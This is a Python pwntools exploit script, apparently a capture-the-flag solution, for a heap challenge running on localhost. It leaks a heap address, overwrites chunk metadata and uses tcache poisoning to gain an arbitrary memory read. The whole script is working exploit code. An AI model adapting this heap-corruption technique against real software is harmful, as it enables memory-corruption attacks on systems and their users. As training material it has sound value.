from pwn import *

elf = ELF("../build_out/chall")
libc = ELF("../build_out/libc.so.6")

def insert(message):
    assert(len(message) < 128)
    assert(not b" " in message)
    assert(not b"\n" in message)
    assert(not b"\t" in message)
    p.sendline(b"insert")
    p.sendline(message)

def delete():
    p.sendline(b"delete")

def peek():
    p.clean()
    p.sendline(b"peek")
    return p.clean()[:-1]

def edit(message):
    assert(len(message) <= 32)
    p.sendline(b"edit")
    p.send(message)

def count():
    p.clean()
    p.sendline(b"count")
    return int(p.recvline().decode()[:-1])

p = process("nc localhost 1337", shell=True)

# Specifies what order chunks should be deleted
order = []
for i in range(26):
    order.append(chr(ord("A") + i).encode())

# Get a heap leak
insert(order[0])
insert(order[2])
insert(order[1])
delete()
delete()
edit(order[2] * 32)
heap_base = int.from_bytes(peek()[32:32+6], "little") - 0x540
print(hex(heap_base))
assert(heap_base % 0x1000 == 0)
edit(order[2] * 16 + p64(0x21) * 2)
delete()

# Overwrite second chunk size
insert(order[2]) # chunk 2
insert(order[1]) # chunk 3
insert(order[0]) # chunk 1

payload = order[0] * 16
payload += p64(0x31) * 2
edit(payload)
delete()

# Tcache poisoning on third chunk
delete()
delete()

payload = order[-1] * 16
payload += b"A" * 16
payload += p64(heap_base + 0x480 - 16)
insert(payload)
edit(order[-1] * 16 + p64(0x21) * 2)

# Arbitrary read
insert(order[1])
insert(order[0])
edit(b"A" * 16)
print(peek().decode()[16:])

p.interactive()
